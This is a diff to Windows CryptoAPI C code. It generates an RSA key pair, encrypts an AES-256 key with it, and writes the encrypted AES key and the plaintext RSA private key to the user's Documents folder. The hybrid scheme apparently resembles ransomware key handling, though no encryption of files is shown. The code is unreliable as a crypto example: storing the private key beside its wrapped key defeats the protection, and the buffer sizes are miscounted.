@@ -774,7 +774,7 @@ BOOL GenerateKeyPairs(HCRYPTPROV* phCryptProv, HCRYPTKEY* phKey) {
 		return TRUE;
 	}
 
-BOOL ExportRSAkeys(HCRYPTPROV hCryptProv, HCRYPTKEY hKey,DWORD flag) {
+BOOL ExportRSAkeys(HCRYPTPROV hCryptProv, HCRYPTKEY hKey,DWORD flag,PBYTE* privateKey,SIZE_T* szPrivateKey) {
 	DWORD keyLen = 0;
 	PBYTE pbKeyBlob = NULL;
 	BOOL result = FALSE;
@@ -789,17 +789,10 @@ BOOL ExportRSAkeys(HCRYPTPROV hCryptProv, HCRYPTKEY hKey,DWORD flag) {
 		return FALSE;
 	}
 
-
 	result = CryptExportKey(hKey, NULL, flag, 0, pbKeyBlob, &keyLen);
 
-	printf("\n\n");
-
-	for (int i = 0; i < keyLen; i++) {
-		if (i % 16 == 0) printf("\n");
-		printf("0x%02X, ", pbKeyBlob[i]);
-	}
-
-	printf("\n\n");
+	*privateKey = pbKeyBlob;
+	*szPrivateKey = keyLen;
 
 	return result;
 }
@@ -846,19 +839,35 @@ BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,BYTE** cipher) {
 	return TRUE;
 }
 
-BOOL RSAwork(uint8_t* keyValue) {
+BOOL RSAwork(uint8_t* keyValue,WCHAR* keyPath) {
 
 	HCRYPTPROV hProv;
-	SIZE_T szEncKey = AES_256_KEY_SIZE;
-	PBYTE encKey = NULL;
 	HCRYPTKEY thKey;
+	SIZE_T szEncKey = AES_256_KEY_SIZE;
+	SIZE_T szPrivateKey = 0;
+	PBYTE privateKey = NULL;
+	PBYTE encKey = NULL;
+	WCHAR AESkeyPath[MAX_PATH * sizeof(WCHAR)];
+	WCHAR privateKeyPath[MAX_PATH * sizeof(WCHAR)];
 
+	lstrcpy(AESkeyPath,keyPath);
+	lstrcpy(privateKeyPath,keyPath);
+
+
+	StringCchCat(AESkeyPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\AES_key");
+	StringCchCat(privateKeyPath, MAX_PATH * sizeof(WCHAR), L"\\Documents\\RSA_client_private_key");
 
 	GenerateKeyPairs(&hProv, &thKey);
-	ExportRSAkeys(hProv, thKey, PRIVATEKEYBLOB);
+	ExportRSAkeys(hProv, thKey, PRIVATEKEYBLOB,&privateKey,&szPrivateKey);
+
+	WriteToFile(privateKey,privateKeyPath,szPrivateKey);
+	
 	EncryptAESKey(thKey, (PBYTE)keyValue, &szEncKey, &encKey);
-	DecryptAESKey(thKey, encKey, &szEncKey);
+	WriteToFile(encKey, AESkeyPath, szEncKey);
+
 	CryptDestroyKey(thKey);
+
+
 
 
 
